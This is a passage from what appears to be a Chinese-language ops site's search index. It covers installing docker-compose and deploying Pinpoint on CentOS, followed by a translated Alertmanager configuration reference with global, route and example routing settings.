\"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose [root@centos7 ~]# sudo chmod +x /usr/local/bin/docker-compose [root@centos7 ~]# sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose [root@centos7 ~]# docker version Client: Docker Engine - Community Version: 20.10.10 API version: 1.41 Go version: go1.16.9 Git commit: b485636 Built: Mon Oct 25 07:44:50 2021 OS/Arch: linux/amd64 Context: default Experimental: true Server: Docker Engine - Community Engine: Version: 20.10.10 API version: 1.41 (minimum version 1.12) Go version: go1.16.9 Git commit: e2f740d Built: Mon Oct 25 07:43:13 2021 OS/Arch: linux/amd64 Experimental: false containerd: Version: 1.4.11 GitCommit: 5b46e404f6b9f661a205e28d59c982d3634148f8 runc: Version: 1.0.2 GitCommit: v1.0.2-0-g52b36a2 docker-init: Version: 0.19.0 GitCommit: de40ad0 [root@centos7 ~]# docker-compose --version docker-compose version 1.29.2, build 5becea4c [root@centos7 ~]# git clone https://github.com/naver/pinpoint-docker.git [root@centos7 ~]# cd pinpoint-docker/ [root@centos7 ~]# git checkout 2.3.0 [root@centos7 ~]# docker-compose pull \u67e5\u770b\u914d\u7f6e\u6587\u4ef6 [root@centos7 ~]# vim .env \u90e8\u7f72\u542f\u52a8\uff0c\u9700\u8981\u4e0b\u8f7d\u955c\u50cf\uff0c\u5931\u8d25\u4e86\u5c31\u91cd\u8bd5 [root@centos7 ~]# docker-compose up -d \u8bbf\u95ee192.168.70.151:8079","title":"Pinpoint\u90e8\u7f72"},{"location":"monitor/","text":"\u4e00\u4e9b\u76d1\u63a7\u7cfb\u7edf","title":"\u4e00\u4e9b\u76d1\u63a7\u7cfb\u7edf"},{"location":"monitor/#_1","text":"","title":"\u4e00\u4e9b\u76d1\u63a7\u7cfb\u7edf"},{"location":"monitor/alertmanager/alertmanager_config/","text":"\u57fa\u672c\u914d\u7f6e Alertmanager \u901a\u8fc7\u547d\u4ee4\u884c\u548c\u914d\u7f6e\u6587\u4ef6\u8fdb\u884c\u914d\u7f6e\u3002 \u5728 \u53ef\u89c6\u5316\u7f16\u8f91\u5668 \u53ef\u4ee5\u5e2e\u52a9\u5efa\u7acb\u8def\u7531\u6811 \u3002\u8fd9\u4e2a\u9875\u9762\u7c98\u8d34alertmanager\u914d\u7f6e\u6587\u4ef6\u540e\uff0c\u4f1a\u628a\u544a\u8b66\u7ebf\u8def\u753b\u51fa\u6765 Alertmanager \u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u91cd\u65b0\u52a0\u8f7d\u5176\u914d\u7f6e\u3002alertmanager\u8fdb\u7a0b\u53d1\u9001SIGHUP\u4fe1\u53f7\u3002\u6216\u8005\u7ed9altermanager\u521b\u5efa\u7684http\u8bf7\u6c42\u53d1\u9001 -reload \u6bd4\u5982\u8fd9\u6837 curl -X POST \"http://10.102.74.90:9090/-/reload\" \u8981\u6307\u5b9a\u8981\u52a0\u8f7d\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u8bf7\u4f7f\u7528\u8be5 --config.file \u6807\u5fd7\u3002 ./alertmanager --config.file=alertmanager.yml Alertmanager\u4e3b\u8981\u8d1f\u8d23\u5bf9Prometheus\u4ea7\u751f\u7684\u544a\u8b66\u8fdb\u884c\u7edf\u4e00\u5904\u7406\uff0c\u56e0\u6b64\u5728Alertmanager\u914d\u7f6e\u4e2d\u4e00\u822c\u4f1a\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u4e3b\u8981\u90e8\u5206\uff1a \u5168\u5c40\u914d\u7f6e\uff08global\uff09\uff1a\u7528\u4e8e\u5b9a\u4e49\u4e00\u4e9b\u5168\u5c40\u7684\u516c\u5171\u53c2\u6570\uff0c\u5982\u5168\u5c40\u7684SMTP\u914d\u7f6e\uff0cSlack\u914d\u7f6e\u7b49\u5185\u5bb9\uff1b \u6a21\u677f\uff08templates\uff09\uff1a\u7528\u4e8e\u5b9a\u4e49\u544a\u8b66\u901a\u77e5\u65f6\u7684\u6a21\u677f\uff0c\u5982HTML\u6a21\u677f\uff0c\u90ae\u4ef6\u6a21\u677f\u7b49\uff1b \u544a\u8b66\u8def\u7531\uff08route\uff09\uff1a\u6839\u636e\u6807\u7b7e\u5339\u914d\uff0c\u786e\u5b9a\u5f53\u524d\u544a\u8b66\u5e94\u8be5\u5982\u4f55\u5904\u7406\uff1b \u63a5\u6536\u4eba\uff08receivers\uff09\uff1a\u63a5\u6536\u4eba\u662f\u4e00\u4e2a\u62bd\u8c61\u7684\u6982\u5ff5\uff0c\u5b83\u53ef\u4ee5\u662f\u4e00\u4e2a\u90ae\u7bb1\u4e5f\u53ef\u4ee5\u662f\u5fae\u4fe1\uff0cSlack\u6216\u8005Webhook\u7b49\uff0c\u63a5\u6536\u4eba\u4e00\u822c\u914d\u5408\u544a\u8b66\u8def\u7531\u4f7f\u7528\uff1b \u6291\u5236\u89c4\u5219\uff08inhibit_rules\uff09\uff1a\u5408\u7406\u8bbe\u7f6e\u6291\u5236\u89c4\u5219\u53ef\u4ee5\u51cf\u5c11\u5783\u573e\u544a\u8b66\u7684\u4ea7\u751f \u8be5\u6587\u4ef6\u4ee5 YAML \u683c\u5f0f \u7f16\u5199\uff1a <duration> : \u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u6301\u7eed\u65f6\u95f4 ((([0-9]+)y)?(([0-9]+)w)?(([0-9]+)d)?(([0-9]+)h)?(([0-9]+)m)?(([0-9]+)s)?(([0-9]+)ms)?|0) \uff0c\u4f8b\u5982 1d , 1h30m , 5m , 10s <labelname> : \u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5b57\u7b26\u4e32 [a-zA-Z_][a-zA-Z0-9_]* <labelvalue> : \u4e00\u4e32unicode\u5b57\u7b26 <filepath> : \u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e2d\u7684\u6709\u6548\u8def\u5f84 <boolean> : \u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u53ef\u4ee5\u53d6\u503c true \u6216 false <string> : \u666e\u901a\u5b57\u7b26\u4e32 <secret> \uff1a\u4f5c\u4e3a\u79d8\u5bc6\u7684\u5e38\u89c4\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982\u5bc6\u7801 <tmpl_string> : \u4f7f\u7528\u524d\u6a21\u677f\u6269\u5c55\u7684\u5b57\u7b26\u4e32 <tmpl_secret> : \u4e00\u4e2a\u5728\u4f7f\u7528\u524d\u88ab\u6a21\u677f\u6269\u5c55\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u662f\u4e00\u4e2a\u5bc6\u7801 <int> : \u4e00\u4e2a\u6574\u6570\u503c global: # \u9ed8\u8ba4\u7684SMTP\u53d1\u4ef6\u4eba\u6807\u5934\u5b57\u6bb5\u3002 [ smtp_from: <tmpl_string> ] #\u7528\u4e8e\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\u7684\u9ed8\u8ba4SMTP \u7aef\u53e3\u53f7 [ smtp_smarthost: <string> ] #SMTP\u7684\u4e3b\u673a\u540d [ smtp_hello: <string> | default = \"localhost\" ] #SMTP\u7684\u4e3b\u673a\u767b\u5f55\u540d\u5b57 [ smtp_auth_username: <string> ] #SMTP\u7684\u4e3b\u673a\u767b\u5f55\u5bc6\u7801 [ smtp_auth_password: <secret> ] # SMTP \u767b\u5f55ID [ smtp_auth_identity: <string> ] # SMTP \u767b\u5f55\u5bc6\u7801 [ smtp_auth_secret: <secret> ] #\u9ed8\u8ba4\u7684SMTP TLS\u8981\u6c42\u3002 #\u8bf7\u6ce8\u610f\uff0cGo\u4e0d\u652f\u6301\u5230\u8fdc\u7a0bSMTP\u7aef\u70b9\u7684\u672a\u52a0\u5bc6\u8fde\u63a5\u3002 [ smtp_require_tls: <bool> | default = true ] #\u7528\u4e8e\u5ef6\u8fdf\u901a\u77e5\u7684API URL\u3002 [ slack_api_url: <secret> ] [ slack_api_url_file: <filepath> ] [ victorops_api_key: <secret> ] [ victorops_api_url: <string> | default = \"https://alert.victorops.com/integrations/generic/20131114/alert/\" ] [ pagerduty_url: <string> | default = \"https://events.pagerduty.com/v2/enqueue\" ] [ opsgenie_api_key: <secret> ] [ opsgenie_api_url: <string> | default = \"https://api.opsgenie.com/\" ] [ wechat_api_url: <string> | default = \"https://qyapi.weixin.qq.com/cgi-bin/\" ] [ wechat_api_secret: <secret> ] [ wechat_api_corp_id: <string> ] # \u9ed8\u8ba4\u7684HTTP\u5ba2\u6237\u7aef\u914d\u7f6e [ http_config: <http_config> ] #ResolveTimeout\u662falertmanager\u5728\u8b66\u62a5\u6267\u884c\u65f6\u4f7f\u7528\u7684\u9ed8\u8ba4\u503c #\u4e0d\u5305\u62ecEndsAt\uff0c\u5728\u6b64\u65f6\u95f4\u8fc7\u540e\uff0c\u5982\u679c\u8b66\u62a5\u5c1a\u672a\u66f4\u65b0\uff0c\u5b83\u53ef\u4ee5\u5c06\u5176\u58f0\u660e\u4e3a\u5df2\u89e3\u51b3\u3002 #\u8fd9\u5bf9\u6765\u81ea\u666e\u7f57\u7c73\u4fee\u65af\u7684\u8b66\u62a5\u6ca1\u6709\u5f71\u54cd\uff0c\u56e0\u4e3a\u5b83\u4eec\u603b\u662f\u5305\u542bEndsAt\u3002 [ resolve_timeout: <duration> | default = 5m ] #\u4ece\u4e2d\u8bfb\u53d6\u81ea\u5b9a\u4e49\u901a\u77e5\u6a21\u677f\u5b9a\u4e49\u7684\u6587\u4ef6\u3002 #\u6700\u540e\u4e00\u4e2a\u7ec4\u4ef6\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26\u5339\u914d\u5668\uff0c\u4f8b\u5982\u201ctemplates/*.tmpl\u201d\u3002 templates: [ - <filepath> ... ] #\u8def\u7531\u6811\u7684\u6839\u8282\u70b9\u3002 route: <route> #\u901a\u77e5\u63a5\u6536\u8005\u7684\u5217\u8868\u3002 receivers: - <receiver> ... #\u6291\u5236\u89c4\u5219\u5217\u8868\u3002 inhibit_rules: [ - <inhibit_rule> ... ] #\u9759\u97f3\u8def\u7531\u7684\u9759\u97f3\u65f6\u95f4\u95f4\u9694\u5217\u8868\u3002 mute_time_intervals: [ - <mute_time_interval> ... ] Route \u8def\u7531\u5757\u5b9a\u4e49\u8def\u7531\u6811\u4e2d\u7684\u4e00\u4e2a\u8282\u70b9\u53ca\u5176\u5b50\u8282\u70b9\u3002\u5982\u679c\u672a\u8bbe\u7f6e\uff0c\u5176\u53ef\u9009\u914d\u7f6e\u53c2\u6570\u5c06\u4ece\u5176\u7236\u8282\u70b9\u7ee7\u627f\u3002 \u6bcf\u4e2a\u8b66\u62a5\u5728\u914d\u7f6e\u7684\u9876\u7ea7\u8def\u7531\u5904\u8fdb\u5165\u8def\u7531\u6811\uff0c\u8be5\u8def\u7531\u6811\u5fc5\u987b\u5339\u914d\u6240\u6709\u8b66\u62a5\uff08\u5373\u6ca1\u6709\u4efb\u4f55\u914d\u7f6e\u7684\u5339\u914d\u5668\uff09\u3002\u7136\u540e\u904d\u5386\u5b50\u8282\u70b9\u3002\u5982\u679c continue \u8bbe\u7f6e\u4e3a false\uff0c\u5b83\u4f1a\u5728\u7b2c\u4e00\u4e2a\u5339\u914d\u7684\u5b69\u5b50\u4e4b\u540e\u505c\u6b62\u3002\u5982\u679c continue \u5728\u5339\u914d\u8282\u70b9\u4e0a\u4e3a true\uff0c\u5219\u8b66\u62a5\u5c06\u7ee7\u7eed\u4e0e\u540e\u7eed\u5144\u5f1f\u8282\u70b9\u5339\u914d\u3002\u5982\u679c\u8b66\u62a5\u4e0e\u8282\u70b9\u7684\u4efb\u4f55\u5b50\u8282\u70b9\u90fd\u4e0d\u5339\u914d\uff08\u6ca1\u6709\u5339\u914d\u7684\u5b50\u8282\u70b9\u6216\u4e0d\u5b58\u5728\uff09\uff0c\u5219\u6839\u636e\u5f53\u524d\u8282\u70b9\u7684\u914d\u7f6e\u53c2\u6570\u5904\u7406\u8b66\u62a5\u3002 \u7ffb\u8bd1\u81ea\uff1ahttps://prometheus.io/docs/alerting/latest/configuration/#route \u4e2a\u4eba\u8ba4\u4e3a\u8be5\u89e3\u91ca\u5df2\u7ecf\u8fc7\u65f6 [ receiver: <string> ] #\u7528\u4e8e\u5c06\u4f20\u5165\u8b66\u62a5\u5206\u7ec4\u5728\u4e00\u8d77\u7684\u6807\u7b7e\u3002\u4f8b\u5982\uff0c #cluster=A\u548calertname=LatencyHigh\u5c06\u51fa\u73b0\u591a\u4e2a\u8b66\u62a5 #\u5206\u6210\u4e00\u7ec4\u3002 # #\u8981\u6309\u6240\u6709\u53ef\u80fd\u7684\u6807\u7b7e\u8fdb\u884c\u805a\u5408\uff0c\u8bf7\u4f7f\u7528\u7279\u6b8a\u503c\u201c\u2026\u201d\u4f5c\u4e3a\u552f\u4e00\u7684\u6807\u7b7e\u540d\u79f0\uff0c\u4f8b\u5982\uff1a #\u5206\u7ec4\u4f9d\u636e\uff1a['\u2026'] #\u8fd9\u5b9e\u9645\u4e0a\u5b8c\u5168\u7981\u7528\u4e86\u805a\u5408\uff0c\u901a\u8fc7\u6240\u6709 #\u6309\u539f\u6837\u53d1\u51fa\u8b66\u62a5\u3002\u8fd9\u4e0d\u53ef\u80fd\u662f\u4f60\u60f3\u8981\u7684\uff0c\u9664\u975e\u4f60\u6709 #\u8b66\u62a5\u91cf\u975e\u5e38\u4f4e\u6216\u4e0a\u6e38\u901a\u77e5\u7cfb\u7edf\u6267\u884c #\u5b83\u81ea\u5df1\u7684\u5206\u7ec4\u3002 [ group_by: '[' <labelname>, ... ']' ] #\u8b66\u62a5\u662f\u5426\u5e94\u7ee7\u7eed\u5339\u914d\u540e\u7eed\u540c\u7ea7\u8282\u70b9\u3002 [ continue: <boolean> | default = false ] #\u4e0d\u63a8\u8350\uff1a\u4f7f\u7528\u4e0b\u9762\u7684\u5339\u914d\u5668\u3002 #\u8b66\u62a5\u5fc5\u987b\u6ee1\u8db3\u7684\u4e00\u7ec4\u76f8\u7b49\u5339\u914d\u5668\u624d\u80fd\u5339\u914d\u8282\u70b9\u3002 match: [ <labelname>: <labelvalue>, ... ] #\u4e0d\u63a8\u8350\uff1a\u4f7f\u7528\u4e0b\u9762\u7684\u5339\u914d\u5668\u3002 #\u8b66\u62a5\u5fc5\u987b\u6ee1\u8db3\u7684\u4e00\u7ec4\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u5668\u624d\u80fd\u5339\u914d\u8282\u70b9\u3002 match_re: [ <labelname>: <regex>, ... ] #\u8b66\u62a5\u5fc5\u987b\u5b8c\u6210\u4ee5\u5339\u914d\u8282\u70b9\u7684\u5339\u914d\u5668\u5217\u8868\u3002 matchers: [ - <matcher> ... ] #\u53d1\u9001\u7ec4\u901a\u77e5\u7684\u521d\u59cb\u7b49\u5f85\u65f6\u95f4 #\u8b66\u62a5\u6570\u91cf\u3002\u5141\u8bb8\u7b49\u5f85\u7981\u6b62\u8b66\u62a5\u5230\u8fbe\u6216\u6536\u96c6 #\u540c\u4e00\u7ec4\u7684\u66f4\u591a\u521d\u59cb\u8b66\u62a5(\u901a\u5e38\u662f0\u5230\u51e0\u5206\u949f\u3002\uff09 [ group_wait: <duration> | default = 30s ] #\u5728\u53d1\u9001\u6709\u5173\u65b0\u8b66\u62a5\u7684\u901a\u77e5\u4e4b\u524d\u8981\u7b49\u5f85\u591a\u957f\u65f6\u95f4 #\u6dfb\u52a0\u5230\u5df2\u53d1\u51fa\u521d\u59cb\u901a\u77e5\u7684\u8b66\u62a5\u7ec4\u4e2d #\u5df2\u7ecf\u53d1\u9001\u4e86(\u901a\u5e38\u7ea65\u5206\u949f\u6216\u4ee5\u4e0a\u3002\uff09 [ group_interval: <duration> | default = 5m ] #\u5982\u679c\u5df2\u7ecf\u53d1\u9001\u4e86\u901a\u77e5\uff0c\u5728\u518d\u6b21\u53d1\u9001\u901a\u77e5\u4e4b\u524d\u8981\u7b49\u5f85\u591a\u957f\u65f6\u95f4 #\u5df2\u6210\u529f\u53d1\u9001\u8b66\u62a5(\u901a\u5e38\u7ea63\u5c0f\u65f6\u6216\u4ee5\u4e0a\uff09\u3002 [ repeat_interval: <duration> | default = 4h ] #\u8def\u7531\u5e94\u9759\u97f3\u7684\u65f6\u95f4\u3002\u8fd9\u4e9b\u5fc5\u987b\u4e0e #\u201c\u9759\u97f3\u65f6\u95f4\u95f4\u9694\u201d\u90e8\u5206\u4e2d\u5b9a\u4e49\u7684\u9759\u97f3\u65f6\u95f4\u95f4\u9694\u3002 #\u6b64\u5916\uff0c\u6839\u8282\u70b9\u4e0d\u80fd\u6709\u4efb\u4f55\u9759\u97f3\u65f6\u95f4\u3002 #\u5f53\u8def\u7531\u88ab\u7981\u7528\u65f6\uff0c\u5b83\u4e0d\u4f1a\u53d1\u9001\u4efb\u4f55\u901a\u77e5\uff0c\u4f46\u662f #\u5426\u5219\u6b63\u5e38\u52a8\u4f5c\uff08\u5305\u62ec\u7ed3\u675f\u8def\u7531\u5339\u914d\u8fc7\u7a0b\uff09 #\u5982\u679c\u672a\u8bbe\u7f6e\u201ccontinue\u201d\u9009\u9879\u3002\uff09 mute_time_intervals: [ - <string> ...] #\u96f6\u4e2a\u6216\u591a\u4e2a\u5b50\u8def\u7531\u3002 routes: [ - <route> ... ] \u4f8b\u5b50 #\u5305\u542b\u5b50\u7ea7\u7ee7\u627f\u7684\u6240\u6709\u53c2\u6570\u7684\u6839\u8def\u7531 #\u5982\u679c\u672a\u8986\u76d6\uff0c\u5219\u8fd4\u56de\u8def\u7531\u3002 route: receiver: 'default-receiver' group_wait: 30s group_interval: 5m repeat_interval: 4h group_by: [cluster, alertname] #\u4e0e\u4ee5\u4e0b\u5b50\u8def\u7531\u4e0d\u5339\u914d\u7684\u6240\u6709\u8b66\u62a5 #\u5c06\u4fdd\u7559\u5728\u6839\u8282\u70b9\u4e0a\u5e76\u88ab\u5206\u6d3e\u5230\u201cdefault receiver\u201d\u3002 routes: #service=mysql\u6216service=cassandra\u7684\u6240\u6709\u8b66\u62a5 - receiver: 'database-pager' group_wait: 10s matchers: - service=~\"mysql|cassandra\" #\u6240\u6709\u5e26\u6709team=frontend\u6807\u7b7e\u7684\u8b66\u62a5\u90fd\u4e0e\u6b64\u5b50\u8def\u7531\u5339\u914d\u3002 - receiver: 'frontend-pager' group_by: [product, environment] matchers: - team=\"frontend\" \u63a5\u4e0b\u6765\u770b\u4e0b\u5b98\u65b9\u5728git\u5e93\u4e2d\u7684\u4f8b\u5b50 https://github.com/prometheus/alertmanager/blob/main/doc/examples/simple.yml","title":"Alertmanager\u914d\u7f6e"},{"location":"monitor/alertmanager/alertmanager_config/#_1","text":"","title":""},{"location":"monitor/alertmanager/alertmanager_config/#_2","text":"Alertmanager \u901a\u8fc7\u547d\u4ee4\u884c\u548c\u914d\u7f6e\u6587\u4ef6\u8fdb\u884c\u914d\u7f6e\u3002 \u5728 \u53ef\u89c6\u5316\u7f16\u8f91\u5668 \u53ef\u4ee5\u5e2e\u52a9\u5efa\u7acb\u8def\u7531\u6811 \u3002\u8fd9\u4e2a\u9875\u9762\u7c98\u8d34alertmanager\u914d\u7f6e\u6587\u4ef6\u540e\uff0c\u4f1a\u628a\u544a\u8b66\u7ebf\u8def\u753b\u51fa\u6765 Alertmanager \u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u91cd\u65b0\u52a0\u8f7d\u5176\u914d\u7f6e\u3002alertmanager\u8fdb\u7a0b\u53d1\u9001SIGHUP\u4fe1\u53f7\u3002\u6216\u8005\u7ed9altermanager\u521b\u5efa\u7684http\u8bf7\u6c42\u53d1\u9001 -reload \u6bd4\u5982\u8fd9\u6837 curl -X POST \"http://10.102.74.90:9090/-/reload\" \u8981\u6307\u5b9a\u8981\u52a0\u8f7d\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u8bf7\u4f7f\u7528\u8be5 --config.file \u6807\u5fd7\u3002 ./alertmanager --config.file=alertmanager.yml Alertmanager\u4e3b\u8981\u8d1f\u8d23\u5bf9Prometheus\u4ea7\u751f\u7684\u544a\u8b66\u8fdb\u884c\u7edf\u4e00\u5904\u7406\uff0c\u56e0\u6b64\u5728Alertmanager\u914d\u7f6e\u4e2d\u4e00\u822c\u4f1a\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u4e3b\u8981\u90e8\u5206\uff1a \u5168\u5c40\u914d\u7f6e\uff08global\uff09\uff1a\u7528\u4e8e\u5b9a\u4e49\u4e00\u4e9b\u5168\u5c40\u7684\u516c\u5171\u53c2\u6570\uff0c\u5982\u5168\u5c40\u7684SMTP\u914d\u7f6e\uff0cSlack\u914d\u7f6e\u7b49\u5185\u5bb9\uff1b \u6a21\u677f\uff08templates\uff09\uff1a\u7528\u4e8e\u5b9a\u4e49\u544a\u8b66\u901a\u77e5\u65f6\u7684\u6a21\u677f\uff0c\u5982HTML\u6a21\u677f\uff0c\u90ae\u4ef6\u6a21\u677f\u7b49\uff1b \u544a\u8b66\u8def\u7531\uff08route\uff09\uff1a\u6839\u636e\u6807\u7b7e\u5339\u914d\uff0c\u786e\u5b9a\u5f53\u524d\u544a\u8b66\u5e94\u8be5\u5982\u4f55\u5904\u7406\uff1b \u63a5\u6536\u4eba\uff08receivers\uff09\uff1a\u63a5\u6536\u4eba\u662f\u4e00\u4e2a\u62bd\u8c61\u7684\u6982\u5ff5\uff0c\u5b83\u53ef\u4ee5\u662f\u4e00\u4e2a\u90ae\u7bb1\u4e5f\u53ef\u4ee5\u662f\u5fae\u4fe1\uff0cSlack\u6216\u8005Webhook\u7b49\uff0c\u63a5\u6536\u4eba\u4e00\u822c\u914d\u5408\u544a\u8b66\u8def\u7531\u4f7f\u7528\uff1b \u6291\u5236\u89c4\u5219\uff08inhibit_rules\uff09\uff1a\u5408\u7406\u8bbe\u7f6e\u6291\u5236\u89c4\u5219\u53ef\u4ee5\u51cf\u5c11\u5783\u573e\u544a\u8b66\u7684\u4ea7\u751f \u8be5\u6587\u4ef6\u4ee5 YAML \u683c\u5f0f \u7f16\u5199\uff1a <duration> : \u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u6301\u7eed\u65f6\u95f4 ((([0-9]+)y)?(([0-9]+)w)?(([0-9]+)d)?(([0-9]+)h)?(([0-9]+)m)?(([0-9]+)s)?(([0-9]+)ms)?|0) \uff0c\u4f8b\u5982 1d , 1h30m , 5m , 10s <labelname> : \u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5b57\u7b26\u4e32 [a-zA-Z_][a-zA-Z0-9_]* <labelvalue> : \u4e00\u4e32unicode\u5b57\u7b26 <filepath> : \u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e2d\u7684\u6709\u6548\u8def\u5f84 <boolean> : \u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u53ef\u4ee5\u53d6\u503c true \u6216 false <string> : \u666e\u901a\u5b57\u7b26\u4e32 <secret> \uff1a\u4f5c\u4e3a\u79d8\u5bc6\u7684\u5e38\u89c4\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982\u5bc6\u7801 <tmpl_string> : \u4f7f\u7528\u524d\u6a21\u677f\u6269\u5c55\u7684\u5b57\u7b26\u4e32 <tmpl_secret> : \u4e00\u4e2a\u5728\u4f7f\u7528\u524d\u88ab\u6a21\u677f\u6269\u5c55\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u662f\u4e00\u4e2a\u5bc6\u7801 <int> : \u4e00\u4e2a\u6574\u6570\u503c global: # \u9ed8\u8ba4\u7684SMTP\u53d1\u4ef6\u4eba\u6807\u5934\u5b57\u6bb5\u3002 [ smtp_from: <tmpl_string> ] #\u7528\u4e8e\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\u7684\u9ed8\u8ba4SMTP \u7aef\u53e3\u53f7 [ smtp_smarthost: <string> ] #SMTP\u7684\u4e3b\u673a\u540d [ smtp_hello: <string> | default = \"localhost\" ] #SMTP\u7684\u4e3b\u673a\u767b\u5f55\u540d\u5b57 [ smtp_auth_username: <string> ] #SMTP\u7684\u4e3b\u673a\u767b\u5f55\u5bc6\u7801 [ smtp_auth_password: <secret> ] # SMTP \u767b\u5f55ID [ smtp_auth_identity: <string> ] # SMTP \u767b\u5f55\u5bc6\u7801 [ smtp_auth_secret: <secret> ] #\u9ed8\u8ba4\u7684SMTP TLS\u8981\u6c42\u3002 #\u8bf7\u6ce8\u610f\uff0cGo\u4e0d\u652f\u6301\u5230\u8fdc\u7a0bSMTP\u7aef\u70b9\u7684\u672a\u52a0\u5bc6\u8fde\u63a5\u3002 [ smtp_require_tls: <bool> | default = true ] #\u7528\u4e8e\u5ef6\u8fdf\u901a\u77e5\u7684API URL\u3002 [ slack_api_url: <secret> ] [ slack_api_url_file: <filepath> ] [ victorops_api_key: <secret> ] [ victorops_api_url: <string> | default = \"https://alert.victorops.com/integrations/generic/20131114/alert/\" ] [ pagerduty_url: <string> | default = \"https://events.pagerduty.com/v2/enqueue\" ] [ opsgenie_api_key: <secret> ] [ opsgenie_api_url: <string> | default = \"https://api.opsgenie.com/\" ] [ wechat_api_url: <string> | default = \"https://qyapi.weixin.qq.com/cgi-bin/\" ] [ wechat_api_secret: <secret> ] [ wechat_api_corp_id: <string> ] # \u9ed8\u8ba4\u7684HTTP\u5ba2\u6237\u7aef\u914d\u7f6e [ http_config: <http_config> ] #ResolveTimeout\u662falertmanager\u5728\u8b66\u62a5\u6267\u884c\u65f6\u4f7f\u7528\u7684\u9ed8\u8ba4\u503c #\u4e0d\u5305\u62ecEndsAt\uff0c\u5728\u6b64\u65f6\u95f4\u8fc7\u540e\uff0c\u5982\u679c\u8b66\u62a5\u5c1a\u672a\u66f4\u65b0\uff0c\u5b83\u53ef\u4ee5\u5c06\u5176\u58f0\u660e\u4e3a\u5df2\u89e3\u51b3\u3002 #\u8fd9\u5bf9\u6765\u81ea\u666e\u7f57\u7c73\u4fee\u65af\u7684\u8b66\u62a5\u6ca1\u6709\u5f71\u54cd\uff0c\u56e0\u4e3a\u5b83\u4eec\u603b\u662f\u5305\u542bEndsAt\u3002 [ resolve_timeout: <duration> | default = 5m ] #\u4ece\u4e2d\u8bfb\u53d6\u81ea\u5b9a\u4e49\u901a\u77e5\u6a21\u677f\u5b9a\u4e49\u7684\u6587\u4ef6\u3002 #\u6700\u540e\u4e00\u4e2a\u7ec4\u4ef6\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26\u5339\u914d\u5668\uff0c\u4f8b\u5982\u201ctemplates/*.tmpl\u201d\u3002 templates: [ - <filepath> ... ] #\u8def\u7531\u6811\u7684\u6839\u8282\u70b9\u3002 route: <route> #\u901a\u77e5\u63a5\u6536\u8005\u7684\u5217\u8868\u3002 receivers: - <receiver> ... #\u6291\u5236\u89c4\u5219\u5217\u8868\u3002 inhibit_rules: [ - <inhibit_rule> ... ] #\u9759\u97f3\u8def\u7531\u7684\u9759\u97f3\u65f6\u95f4\u95f4\u9694\u5217\u8868\u3002 mute_time_intervals: [ - <mute_time_interval> ... ]","title":"\u57fa\u672c\u914d\u7f6e"},{"location":"monitor/alertmanager/alertmanager_config/#route","text":"\u8def\u7531\u5757\u5b9a\u4e49\u8def\u7531\u6811\u4e2d\u7684\u4e00\u4e2a\u8282\u70b9\u53ca\u5176\u5b50\u8282\u70b9\u3002\u5982\u679c\u672a\u8bbe\u7f6e\uff0c\u5176\u53ef\u9009\u914d\u7f6e\u53c2\u6570\u5c06\u4ece\u5176\u7236\u8282\u70b9\u7ee7\u627f\u3002 \u6bcf\u4e2a\u8b66\u62a5\u5728\u914d\u7f6e\u7684\u9876\u7ea7\u8def\u7531\u5904\u8fdb\u5165\u8def\u7531\u6811\uff0c\u8be5\u8def\u7531\u6811\u5fc5\u987b\u5339\u914d\u6240\u6709\u8b66\u62a5\uff08\u5373\u6ca1\u6709\u4efb\u4f55\u914d\u7f6e\u7684\u5339\u914d\u5668\uff09\u3002\u7136\u540e\u904d\u5386\u5b50\u8282\u70b9\u3002\u5982\u679c continue \u8bbe\u7f6e\u4e3a false\uff0c\u5b83\u4f1a\u5728\u7b2c\u4e00\u4e2a\u5339\u914d\u7684\u5b69\u5b50\u4e4b\u540e\u505c\u6b62\u3002\u5982\u679c continue \u5728\u5339\u914d\u8282\u70b9\u4e0a\u4e3a true\uff0c\u5219\u8b66\u62a5\u5c06\u7ee7\u7eed\u4e0e\u540e\u7eed\u5144\u5f1f\u8282\u70b9\u5339\u914d\u3002\u5982\u679c\u8b66\u62a5\u4e0e\u8282\u70b9\u7684\u4efb\u4f55\u5b50\u8282\u70b9\u90fd\u4e0d\u5339\u914d\uff08\u6ca1\u6709\u5339\u914d\u7684\u5b50\u8282\u70b9\u6216\u4e0d\u5b58\u5728\uff09\uff0c\u5219\u6839\u636e\u5f53\u524d\u8282\u70b9\u7684\u914d\u7f6e\u53c2\u6570\u5904\u7406\u8b66\u62a5\u3002 \u7ffb\u8bd1\u81ea\uff1ahttps://prometheus.io/docs/alerting/latest/configuration/#route \u4e2a\u4eba\u8ba4\u4e3a\u8be5\u89e3\u91ca\u5df2\u7ecf\u8fc7\u65f6 [ receiver: <string> ] #\u7528\u4e8e\u5c06\u4f20\u5165\u8b66\u62a5\u5206\u7ec4\u5728\u4e00\u8d77\u7684\u6807\u7b7e\u3002\u4f8b\u5982\uff0c #cluster=A\u548calertname=LatencyHigh\u5c06\u51fa\u73b0\u591a\u4e2a\u8b66\u62a5 #\u5206\u6210\u4e00\u7ec4\u3002 # 